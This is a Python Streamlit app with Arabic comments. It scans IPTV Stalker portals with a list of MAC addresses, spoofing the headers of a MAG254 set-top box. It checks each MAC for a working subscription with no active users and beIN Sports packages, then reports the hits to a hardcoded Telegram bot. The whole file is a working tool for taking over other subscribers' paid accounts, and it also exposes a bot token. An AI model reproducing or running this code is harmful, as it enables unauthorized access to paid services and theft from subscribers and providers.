import streamlit as st
import requests
import time
import telebot
import re
import urllib3
from datetime import datetime

# إيقاف التحذيرات الأمنية لضمان استمرارية الفحص
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- إعدادات الاتصال (بياناتك) ---
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الباقات المفضلة للبحث عنها
FAV_CHANNELS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# --- واجهة المستخدم ---
st.set_page_config(page_title="Radar Ayoub Hammami Pro", layout="wide")

st.markdown("""
    <style>
    .status-working { color: #00FF00; font-weight: bold; }
    .status-offline { color: #FF0000; font-weight: bold; }
    .stMetric { background-color: #111; padding: 10px; border-radius: 10px; border-left: 5px solid #ff4b4b; }
    </style>
    """, unsafe_allow_html=True)

st.title("📡 Radar Ayoub Hammami Pro V2")
st.subheader("نظام الفحص السري والمتطور للسيرفرات")

input_text = st.text_area("🚀 الصق الرابط والماكات هنا (سيتم استخراجها تلقائياً):", height=150)

def get_stealth_headers(mac):
    """توليد رأسيات طلب متخفية تحاكي جهاز MAG254 حقيقي تماماً"""
    return {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Safari/533.3',
        'X-User-Agent': 'Model: MAG254; Link: WiFi',
        'Cookie': f'mac={mac}',
        'Referer': 'http://mag.infomir.com/',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Accept-Language': 'en-US,*'
    }

if st.button("🏁 بدء عملية الصيد السري"):
    # استخراج البيانات عبر Regex
    macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', input_text.upper())))
    host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', input_text)
    
    if host_match and macs:
        base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
        api_url = f"{base_url}/portal.php"
        
        st.info(f"🌐 السيرفر المستهدف: {base_url} | 🎯 عدد الماكات: {len(macs)}")
        
        # لوحة العدادات
        c1, c2, c3 = st.columns(3)
        checked_stat = c1.empty()
        found_stat = c2.empty()
        
        progress = st.progress(0)
        results = []
        
        for i, mac in enumerate(macs):
            headers = get_stealth_headers(mac)
            try:
                # 1. فحص البروفايل (للحالة، المستخدمين، والتاريخ)
                start_time = time.time()
                r = requests.get(f"{api_url}?type=stb&action=get_profile&force_stb=1", 
                                 headers=headers, timeout=10, verify=False)
                latency = (time.time() - start_time) * 1000
                
                if r.status_code == 200 and '"active_cons"' in r.text:
                    # تحليل البيانات
                    active_users = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text).group(1)
                    expiry = re.search(r'"end_date"\s*:\s*"([^"]+)"', r.text).group(1) if '"end_date"' in r.text else "غير محدد"
                    
                    # قوة السيرفر بناءً على سرعة الاستجابة
                    strength = "قوي (ثابت) ✅" if latency < 800 else "متقطع (ضعيف) ⚠️"
                    
                    # 2. فحص الباقات المفضلة
                    r_ch = requests.get(f"{api_url}?type=itv&action=get_all_channels", 
                                        headers=headers, timeout=10, verify=False)
                    ch_text = r_ch.text.upper()
                    found_favs = [name for name, keys in FAV_CHANNELS.items() if all(k in ch_text for k in keys)]
                    
                    # عرض الحالة باللون الأخضر في الجدول
                    status_html = '<span class="status-working">يشتغل 🟢</span>'
                    
                    res_data = {
                        "الماك": mac,
                        "الحالة": "يشتغل",
                        "القوة": strength,
                        "المستخدمين": active_users,
                        "تاريخ الانتهاء": expiry,
                        "الباقات": ", ".join(found_favs) if found_favs else "❌ غير متوفرة"
                    }
                    results.append(res_data)
                    
                    # إرسال تنبيه تلغرام فور الصيد
                    if active_users == "0":
                        alert = (f"🎯 **صيد ذهبي جديد!**\n\n"
                                 f"🖥️ الماك: `{mac}`\n"
                                 f"📊 القوة: {strength}\n"
                                 f"👥 المستخدمين الآن: {active_users}\n"
                                 f"📅 الانتهاء: `{expiry}`\n"
                                 f"🌐 السيرفر: {base_url}\n"
                                 f"📺 الباقات: {', '.join(found_favs) if found_favs else 'لا توجد'}")
                        bot.send_message(ID, alert, parse_mode="Markdown")
                        st.toast(f"✅ تم صيد ماك متاح: {mac}")

                else:
                    results.append({"الماك": mac, "الحالة": "معطل 🔴", "القوة": "-", "المستخدمين": "-", "تاريخ الانتهاء": "-", "الباقات": "-"})
            
            except Exception:
                results.append({"الماك": mac, "الحالة": "معطل 🔴", "القوة": "فشل اتصال", "المستخدمين": "-", "تاريخ الانتهاء": "-", "الباقات": "-"})
            
            # تحديث العدادات
            checked_stat.metric("إجمالي الفحص", i + 1)
            found_stat.metric("الماكات المتاحة (0 متصل)", len([r for r in results if r.get("المستخدمين") == "0"]))
            progress.progress((i + 1) / len(macs))
            time.sleep(0.5)

        # عرض النتائج في جدول نهائي
        st.divider()
        st.table(results)
        st.balloons()

    else:
        st.error("❌ خطأ: يرجى التأكد من وضع رابط صحيح وماكات صالحة.")
